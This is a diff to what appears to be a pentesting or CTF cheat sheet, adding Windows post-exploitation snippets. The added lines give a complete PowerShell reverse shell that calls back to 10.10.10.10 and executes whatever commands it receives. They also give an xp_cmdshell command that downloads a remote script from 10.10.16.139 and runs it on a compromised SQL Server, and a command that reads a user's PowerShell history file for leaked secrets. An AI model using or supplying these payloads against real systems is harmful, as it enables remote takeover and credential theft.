@@ -89,3 +89,18 @@ find / -group <groupname> 2>/dev//null # to find a specific group name
 python -c 'import pty; pty.spawn("/bin/bash")'
 # here pty module let's us spawn a pseudo terminal
 ```
+
+## Reverse shell ps1
+```bash
+$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+// execute the xp_cmd command bellow on the compromised target system 
+// on a xp_cmdshell environment 
+
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.139/powershell_reverse_shell.ps1\");"
+```
+
+## Discovering Powershell history
+```bash
+type C:\Users\<groupname>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
